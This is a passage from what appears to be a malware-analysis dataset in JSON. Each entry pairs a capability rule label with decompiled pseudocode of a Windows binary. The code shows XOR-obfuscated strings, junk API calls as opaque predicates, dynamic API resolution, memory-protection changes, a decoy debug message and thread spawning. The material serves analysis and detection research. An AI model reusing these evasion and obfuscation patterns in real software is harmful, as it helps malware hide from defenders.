*0x41e1e0);\n                if (piStack144 == NULL) {\n                    (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(arg_8h[1], &stack0xffffff70);\n                    *0x41e1e0 = CONCAT44(*0x41e1e4, *0x41e1e0);\n                }\n            }\n        }\n        else {\n            puVar14 = 0x8;\n            uStack76 = 0x342e153f;\n            uStack72 = 0xd357a39;\n            uStack68 = CONCAT22(uStack68._2_2_, 0x5826);\n            uStack100 = 0x584a6151;\n            uStack96 = CONCAT22(uStack96._2_2_, 0x5455);\n            iVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            iVar6 = 6;\n            iVar5 = 0;\n            puStack120 = &stack0xffffffa8 + -iVar11;\n            uStack124 = iVar11;\n            do {\n                iVar13 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                if (iVar13 != 0x4733ae) {\n                    *(iVar5 + iVar11) = (&stack0xffffff90)[iVar5 % iVar6] ^ (iVar5 + iVar11)[puStack120];\n                }\n                iVar5 = iVar5 + 1;\n            } while (iVar5 < 10);\n            uVar15 = 8;\n            uStack64 = 0xa2d4d11;\n            uStack60 = 0x4d222b46;\n            iStack56 = 0x2b471c24;\n            uStack52 = 0x3b296d31;\n            uStack48 = 0x39272f51;\n            puStack112 = 0x49413943;\n            uStack108 = CONCAT22(uStack108._2_2_, 0x4e34);\n            uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n            iVar5 = 0;\n            do {\n                iVar6 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                if (iVar6 != 0x2aa1d) {\n                    *(iVar5 + iVar11) =\n                         (&stack0xffffff84)[iVar5 % iVar16] ^ (iVar5 + iVar11)[&stack0xffffffb4 + -iVar11];\n                }\n                iVar5 = iVar5 + 1;\n            } while (iVar5 < 0x14);\n            uVar10 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(unaff_EDI, iVar11);\n            pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar10);\n            uVar10 = 0xffffffff;\n            if (pcVar8 != NULL) {\n                iVar16 = (*pcVar8)(*arg_8h, 0, 0, 0, 0, 0, uVar15, lpParameter, puVar14, &stack0xffffff80);\n                if (iVar16 < 0) {\n                    uVar10 = fcn.00405d7e();\n                }\n                else {\n                    piStack144 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*puVar14, 30000);\n                    if (piStack144 == NULL) {\n                        (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*puVar14, &stack0xffffff70);\n                    }\n                    uVar10 = 0;\n                }\n            }\n            uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n            uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, unaff_EDI);\n            (*pcVar8)(uVar15);\n            *0x41e1e0 = CONCAT44(*0x41e1e4, *0x41e1e0);\n        }\n    }\ncode_r0x00407aab:\n    *0x41e1e4 = *0x41e1e0 >> 0x20;\n    *0x41e1dc = *0x41e1d8 >> 0x20;\n    return uVar10;\n}\n",
        "token_count": 5186
    },
    "00407bac": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00407bac(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    code *pcVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_34ch;\n    uint var_144h;\n    uint var_104h;\n    uint var_c4h;\n    uint var_b8h;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_89h;\n    uint var_85h;\n    uint var_81h;\n    uchar var_7dh;\n    uchar var_7ch;\n    uint var_7bh;\n    uint var_77h;\n    uint var_73h;\n    uint var_6fh;\n    uint var_6bh;\n    uint var_67h;\n    uint var_63h;\n    uint var_5fh;\n    uint var_59h;\n    uint var_55h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uchar var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_a8h = 0x208;\n    (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"MP3 file corrupted\");\n    uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x40892b, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n    iVar3 = fcn.0040840d();\n    if (iVar3 == 0) {\n        fcn.00408ac6();\n        fcn.00403fd6();\n        while (iVar3 = fcn.00403ed2(),  iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    iVar3 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(str.EFFDZ., 0x184, 0x40, &var_98h);\n    if (iVar3 != 0) {\n        fcn.004095af();\n        (*pcVar6)(str.EFFDZ., 0x184, var_98h, &var_98h);\n    }\n    puVar7 = 0x41db70;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.00401c11();\n    puVar9 = &var_c4h;\n    for (iVar3 = 0x1c; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &var_a4h;\n    for (iVar3 = 0xc; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar7 = 0x41db60;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar9 = &var_34ch;\n    for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_GetUserNameW)(&var_34ch, &var_a8h);\n    var_38h = 5;\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar3 != 0) {\n        var_20h = 0x33046f02;\n        var_1ch = 0x573d5728;\n        var_18h = 0x6f166d7d;\n        var_14h = 0x5728331a;\n        var_10h._0_1_ = 0x6f;\n        var_10h._1_1_ = 0x57;\n        var_28h = 0x33576f57;\n        var_24h._0_1_ = 0x6d;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar8 = 0;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n            if (iVar4 != 0x1cd2c6) {\n                *(iVar8 + iVar3) = *(&var_28h + iVar8 % var_38h) ^ (iVar8 + iVar3)[&var_20h - iVar3];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x12);\n        (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(iVar3, &var_34ch);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    iVar3 = fcn.0040ee8e();\n    var_40h = 6;\n    if (iVar3 != 0) {\n        if (2 < var_c4h._1_1_) {\n            iVar3 = 0;\n            if (0 < var_c4h._1_1_ - 2) {\n                do {\n                    *0x41db50 = *0x41db50 + (&var_b8h)[iVar3];\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 < var_c4h._1_1_ - 2);\n            }\n        }\n        *0x41db50 = *0x41db50 ^ 0x43103655;\n        iVar3 = fcn.0040896d();\n        if (iVar3 != 0) {\n            if (*0x41dabc < 6) {\n                var_94h = 0x2f7a4d08;\n                var_90h._0_2_ = 0x2974;\n                var_90h._2_1_ = 5;\n                stack0xffffff6f = 0x8501b34;\n                var_89h = 0x694c7727;\n                var_85h = 0x644f0829;\n                var_81h._0_2_ = 0x6933;\n                var_81h._2_1_ = 0x24;\n                var_81h._3_1_ = 6;\n                var_7dh = 0x25;\n                var_7bh = 0x742a154c;\n                var_77h = 0x1c36775d;\n                var_73h = 0x77276742;\n                var_6fh._0_2_ = 0x1b38;\n                var_6fh._2_1_ = 0x28;\n                var_6bh = 0x69360b5d;\n                var_67h = 0x19277450;\n                var_63h = 0x742a7a5e;\n                var_5fh._0_1_ = 0x29;\n                stack0xffffff9f = 0x8501b34;\n                var_59h = 0x694c7727;\n                var_55h = 0x4c4f0e29;\n                var_8h = 0x6b52774c;\n                var_4h._0_2_ = 0x664f;\n                var_7ch = var_90h._2_1_;\n                var_6fh._3_1_ = var_81h._3_1_;\n                var_5fh._1_1_ = var_90h._2_1_;\n                uVar2 = (*pcVar6)(8, 0x44);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar8 = 0;\n                var_44h = &var_94h - iVar3;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n                    if (iVar4 != 0x6efa47) {\n                        *(iVar8 + iVar3) = *(&var_8h + iVar8 % var_40h) ^ (iVar8 + iVar3)[var_44h];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0x43);\n            }\n            else {\n                var_1ch = 0x1e416201;\n                var_18h = 0x27636925;\n                var_14h = 0x63695204;\n                var_10h._0_1_ = 0x25;\n                var_10h._1_1_ = 4;\n                var_10h._2_2_ = 0x5240;\n                var_28h = 0x53695852;\n                var_24h._0_1_ = 0x69;\n                uVar2 = (*pcVar6)(8, 0x11);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar8 = 0;\n                var_44h = &var_1ch - iVar3;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n                    if (iVar4 != 0xec0e25) {\n                        *(iVar8 + iVar3) = *(&var_28h + iVar8 % var_38h) ^ (iVar8 + iVar3)[var_44h];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0x10);\n            }\n            var_a4h = 0xc;\n            var_9ch = 0;\n            var_a0h = 0;\n            (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)(iVar3, 1, &var_a0h, 0);\n            uVar2 = (*pcVar6)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n    }\n    *0x41db6c = fcn.0040903e();\n    *0x41db6c = *0x41db6c & 0xffff;\n    var_1ch = 0x6f2f3629;\n    var_18h = 0x2b241b41;\n    var_14h = 0x1d5e452e;\n    var_10h._0_1_ = 0x3e;\n    var_10h._1_1_ = 0x4e;\n    var_8h = 0x304a4e4c;\n    var_4h._0_2_ = 0x7832;\n    uVar2 = (*pcVar6)(8, 0xf);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_50h = &var_1ch - iVar3;\n    var_44h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar4 != 0x4f7148) {\n            *(iVar8 + iVar3) = *(&var_8h + iVar8 % var_40h) ^ (iVar8 + iVar3)[var_50h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    var_1ch = 0x6074401;\n    var_18h = 0x95c1329;\n    var_14h = 0x441f2806;\n    var_10h._0_1_ = 0xb;\n    var_10h._1_1_ = 0x68;\n    var_28h = 0x68663072;\n    var_24h._0_1_ = 0x4d;\n    uVar2 = (*pcVar6)(8, 0xf);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_34h = 0;\n    var_3ch = &var_1ch - iVar3;\n    var_50h = iVar3;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar8 != 0x1116a4) {\n            *(var_34h + iVar3) = *(&var_28h + var_34h % var_38h) ^ (var_34h + iVar3)[var_3ch];\n        }\n        var_34h = var_34h + 1;\n    } while (var_34h < 0xe);\n    var_8h = 0x4939116d;\n    var_4h._0_2_ = 0x4851;\n    var_4ch = 0x6c666248;\n    var_48h._0_1_ = 0x35;\n    uVar2 = (*pcVar6)(8, 7);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_3ch = &var_8h - iVar3;\n    var_28h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar4 != 0x95625f) {\n            *(iVar8 + iVar3) = *(&var_4ch + iVar8 % var_38h) ^ (iVar8 + iVar3)[var_3ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 6);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_104h, iVar3, var_44h, *0x413440);\n    *0x41dadc = fcn.00409827();\n    *0x41db6c = 6000;\n    var_34h = var_34h & 0xff000000 | 0x685443;\n    var_30h = 0x42683066;\n    var_2ch._0_1_ = 0x44;\n    uVar2 = (*pcVar6)(8, 4);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_3ch = &var_34h - iVar3;\n    var_4ch = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar4 != 0xae8356) {\n            *(iVar8 + iVar3) = *(&var_30h + iVar8 % var_38h) ^ (iVar8 + iVar3)[var_3ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 3);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_144h, iVar3, *0x41db6c);\n    var_30h = 0x21221b0c;\n    var_2ch._0_1_ = 0x74;\n    var_8h = 0x44576978;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x74);\n    uVar2 = (*pcVar6)(8, 6);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_34h = &var_30h - iVar3;\n    var_3ch = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar4 != 0xf4f476) {\n            *(iVar8 + iVar3) = *(&var_8h + iVar8 % var_38h) ^ (iVar8 + iVar3)[var_34h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_18h = 0x273b3404;\n    var_14h = 0x382d153e;\n    var_10h._0_1_ = 0x31;\n    var_10h._1_1_ = 0x43;\n    var_8h = 0x43555172;\n    var_4h._0_2_ = 0x6751;\n    uVar2 = (*pcVar6)(8, 0xb);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_30h = &var_18h - iVar3;\n    var_34h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar4 != 0xd612bb) {\n            *(iVar8 + iVar3) = *(&var_8h + iVar8 % var_40h) ^ (iVar8 + iVar3)[var_30h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_20h = 0x425275c;\n    var_1ch = 0x2f294340;\n    var_18h = 0x2942430f;\n    var_14h = 0x43420f3a;\n    var_10h._0_1_ = 0x2f;\n    var_10h._1_1_ = 0x28;\n    var_10h._2_2_ = 0x300f;\n    var_8h = 0x6a4c4631;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x30);\n    uVar2 = (*pcVar6)(8, 0x15);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_30h = &var_20h - iVar3;\n    var_40h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        if (iVar4 != 0xd317b0) {\n            *(iVar8 + iVar3) = *(&var_8h + iVar8 % var_38h) ^ (iVar8 + iVar3)[var_30h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x14);\n    var_20h = 0x73a333b;\n    var_1ch = 0x3d1e043d;\n    var_18h = 0x3c0c2610;\n    var_14h = 0x1d200c04;\n    var_10h._0_1_ = 0x10;\n    var_10h._1_1_ = 0x35;\n    var_10h._2_2_ = 0x3710;\n    var_ch = 0x69;\n    var_8h = 0x63545269;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x52);\n    uVar2 = (*pcVar6)(8, 0x16);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_30h = &var_20h - iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar4 != 0x8620ce) {\n            *(iVar8 + iVar3) = *(&var_8h + iVar8 % var_38h) ^ (iVar8 + iVar3)[&var_20h - iVar3];\n        }\n        pcVar6 = _sym.imp.KERNEL32.dll_SetEnvironmentVariableA;\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x15);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(var_50h, var_3ch);\n    (*pcVar6)(var_34h, &var_104h);\n    (*pcVar6)(var_40h, 0x413444);\n    (*pcVar6)(iVar3, &var_144h);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    puVar9 = puVar5;\n    for (iVar8 = 0xc; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar5 = 0x20;\n    *0x41daa4 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n    pcVar6 = _sym.imp.KERNEL32.dll_CreateThread;\n    *0x41db70 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040e7aa, puVar5, 0, 0);\n    *0x41db74 = (*pcVar6)(0, 0, fcn.0040533b, *0x41daac, 0, 0);\n    *0x41db78 = (*pcVar6)(0, 0, fcn.0040abd5, puVar5, 0, 0);\n    *0x41db7c = (*pcVar6)(0, 0, 0x40634a, puVar5, 0, 0);\n    uVar2 = (*pcVar6)(0, 0, fcn.0040f21e, arg_8h, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, var_40h);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_34h);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_3ch);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_4ch);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_28h);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_50h);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_44h);\n    (*pcVar6)(uVar2);\n    return 0;\n}\n",
        "token_count": 5505
    },
    "004087cd": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004087cd(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpModuleName;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    puVar9 = &var_24h;\n    for (iVar7 = 8; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_30h = 0x342e153f;\n    var_2ch._0_2_ = 0x7a39;\n    var_2ch._2_1_ = 0x35;\n    var_2ch._3_1_ = 0xd;\n    var_28h._0_2_ = 0x5826;\n    var_1ch = 0x584a6151;\n    var_18h._0_2_ = 0x5455;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_4h = 6;\n    iVar8 = 0;\n    lpModuleName = iVar7;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar4 != 0x4733ae) {\n            *(iVar8 + iVar7) = *(&var_1ch + iVar8 % var_4h) ^ (iVar8 + iVar7)[&var_30h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_34h = 0x13342c22;\n    var_30h = 0x2d001e2a;\n    var_2ch._0_2_ = 0x352c;\n    var_2ch._2_1_ = 6;\n    var_2ch._3_1_ = 1;\n    var_28h._0_2_ = 0x6b13;\n    var_28h._2_1_ = 0x6a;\n    var_28h._3_1_ = 0x50;\n    var_1ch = 0x50585870;\n    var_18h._0_2_ = 0x7345;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_ch = &var_34h - iVar7;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        iVar4 = lpModuleName;\n        if (iVar5 != 0x6e1cb8) {\n            *(iVar8 + iVar7) = *(&var_1ch + iVar8 % var_4h) ^ (iVar8 + iVar7)[&var_34h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x10);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar7);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    cVar2 = fcn.0040fe03();\n    if (cVar2 != '\\0') {\n        var_8h = (*pcVar6)(0, var_20h, var_24h);\n    }\n    fcn.00409a4e();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar1)(0, iVar4);\n    (*pcVar6)(uVar3);\n    return var_8h;\n}\n",
        "token_count": 1050
    },
    "0040896d": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040896d(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = *0x41db50;\n    fcn.00405c5a();\n    uVar2 = fcn.00405c5a();\n    iVar3 = fcn.004084f3(uVar2 & 0xff, 0x41db50, 0x41db54, &var_8h);\n    if (iVar3 != 0) {\n        iVar3 = fcn.004084f3(0, 0x41db50, 0x41db58, &var_8h);\n        if (iVar3 != 0) {\n            var_24h = 0x7609731f;\n            var_20h = 0x7354740e;\n            var_1ch._0_2_ = 0x766c;\n            var_18h = 0x766c7331;\n            var_14h._0_2_ = 0x7476;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetCapture)();\n                if (iVar5 != 0x738eaa) {\n                    var_10h = 6;\n                    *(iVar6 + iVar3) = *(&var_18h + iVar6 % 6) ^ (iVar6 + iVar3)[&var_24h - iVar3];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 10);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x41db58, iVar3);\n            iVar6 = fcn.004084f3(0, 0x41db50, 0x41db68, &var_8h);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar6 != 0) {\n                var_4h = var_4h ^ 0x29787279;\n                var_4h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                iVar6 = fcn.004084f3(0, &var_4h, 0x41db5c, &var_8h);\n                if (iVar6 != 0) {\n                    var_ch = 1;\n                }\n            }\n            uVar4 = (*pcVar1)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 708
    },
    "00408ac6": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00408ac6(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int16_t *piVar8;\n    int32_t iVar9;\n    uchar *puVar10;\n    uchar *puStack1420;\n    uchar *puStack1416;\n    uint uStack1412;\n    uint uStack1408;\n    uint uStack1404;\n    uchar *puStack1400;\n    uint uStack1396;\n    uint uStack1392;\n    uint uStack1388;\n    uchar *puStack1384;\n    uint uStack1380;\n    uint uStack1376;\n    uchar uStack1372;\n    uchar uStack1371;\n    uchar uStack1370;\n    uchar uStack1369;\n    uchar uStack1368;\n    uchar uStack1367;\n    uchar uStack1366;\n    uchar uStack1365;\n    uchar uStack1364;\n    ushort uStack1363;\n    uchar uStack1361;\n    uchar *puStack1360;\n    uint uStack1356;\n    uint uStack1352;\n    uchar *puStack1348;\n    int32_t iStack1332;\n    uint uStack1328;\n    uint uStack1324;\n    code *pcStack1320;\n    uint uStack1316;\n    uint uStack1312;\n    uchar uStack1308;\n    uchar *puStack1304;\n    int32_t iStack1300;\n    uint uStack1296;\n    uchar *puStack1292;\n    uint uStack1288;\n    uint uStack1284;\n    uint uStack1280;\n    uint32_t uStack1276;\n    uint uStack1272;\n    uint uStack1268;\n    uint uStack1264;\n    uint uStack1260;\n    int32_t iStack1256;\n    ushort uStack1252;\n    uchar uStack1250;\n    uint uStack1249;\n    uint uStack1245;\n    uint uStack1241;\n    uint uStack1237;\n    uint uStack1233;\n    uint32_t uStack1229;\n    uint uStack1225;\n    uint uStack1221;\n    uint uStack1217;\n    uchar uStack1213;\n    uchar uStack1212;\n    uchar uStack1211;\n    ushort uStack1210;\n    uint32_t uStack1208;\n    int32_t iStack1204;\n    int32_t iStack1180;\n    int32_t iStack1176;\n    uint uStack1172;\n    int32_t iStack1160;\n    uint uStack1156;\n    int16_t iStack1148;\n    uchar auStack1146 [6];\n    uint uStack1140;\n    uchar auStack1136 [12];\n    uchar auStack1124 [4];\n    uchar auStack1120 [52];\n    uchar auStack1068 [36];\n    uchar auStack1032 [1028];\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uStack1140 = 0x200;\n    pcStack1320 = 0x1622330d;\n    puVar10 = &stack0xfffffbf8;\n    for (iVar7 = 0x400; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uStack1316 = 0x62650a26;\n    puVar10 = &stack0xfffffb90;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puStack1348 = 0xe;\n    uStack1312 = 0x3a0a2756;\n    puVar10 = &stack0xfffffbd4;\n    for (iVar7 = 0x24; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uStack1352 = 8;\n    uStack1308 = 0x50;\n    uStack1276 = 0x78505666;\n    uStack1272 = CONCAT31(uStack1272._1_3_, 0x43);\n    uStack1356 = 0x408b3e;\n    uStack1356 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    puStack1360 = 0x408b45;\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iStack1176 = 5;\n    uStack1156 = 0;\n    iVar9 = 0;\n    puStack1292 = &stack0xfffffacc + -iVar7;\n    iStack1160 = iVar7;\n    do {\n        puStack1360 = 0x408b74;\n        iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar4 != 0xba32d9) {\n            *(iVar9 + iVar7) = 